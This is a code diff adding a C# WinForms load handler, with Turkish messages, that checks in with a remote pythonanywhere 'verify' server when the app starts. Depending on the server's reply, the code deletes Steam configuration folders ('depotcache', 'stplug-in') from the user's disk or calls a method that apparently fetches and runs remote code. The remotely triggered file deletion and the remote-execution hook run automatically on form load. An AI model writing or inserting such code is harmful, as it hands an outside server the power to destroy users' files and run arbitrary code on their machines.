@@ -1,1 +1,60 @@
 
+private async void Form1_Load(object? sender, EventArgs e)
+{
+    try
+    {
+        string url = "https://kvtsteamapi1.pythonanywhere.com/verify";
+        string response = await httpClient.GetStringAsync(url);
+
+        if (response.Contains("\"banned\":true"))
+        {
+            string msg = GetJsonValue(response, "message");
+
+            DeleteFolder(@"C:\Program Files (x86)\Steam\config\depotcache");
+            DeleteFolder(@"C:\Program Files (x86)\Steam\config\stplug-in");
+
+            MessageBox.Show(msg + "\nBazı Steam klasörleri silindi.", "Banlandın", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            Application.Exit();
+        }
+        else if (response.Contains("\"success\":true"))
+        {
+            await RunRemoteCodeAsync(); // kodları çalıştır
+        }
+        else
+        {
+            MessageBox.Show("Yetkisiz IP. Erişim reddedildi.", "Erişim Hatası", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+            Application.Exit();
+        }
+    }
+    catch (Exception ex)
+    {
+        MessageBox.Show("API bağlantı hatası: " + ex.Message, "Bağlantı Hatası", MessageBoxButtons.OK, MessageBoxIcon.Error);
+        Application.Exit();
+    }
+}
+
+private void DeleteFolder(string path)
+{
+    try
+    {
+        if (Directory.Exists(path))
+        {
+            Directory.Delete(path, true);
+        }
+    }
+    catch (Exception ex)
+    {
+        MessageBox.Show("Klasör silinemedi: " + path + "\nHata: " + ex.Message, "Silme Hatası", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+    }
+}
+
+private string GetJsonValue(string json, string key)
+{
+    string pattern = $"\"{key}\":\"";
+    int startIndex = json.IndexOf(pattern);
+    if (startIndex == -1) return "";
+    startIndex += pattern.Length;
+    int endIndex = json.IndexOf("\"", startIndex);
+    if (endIndex == -1) return "";
+    return json.Substring(startIndex, endIndex - startIndex);
+}
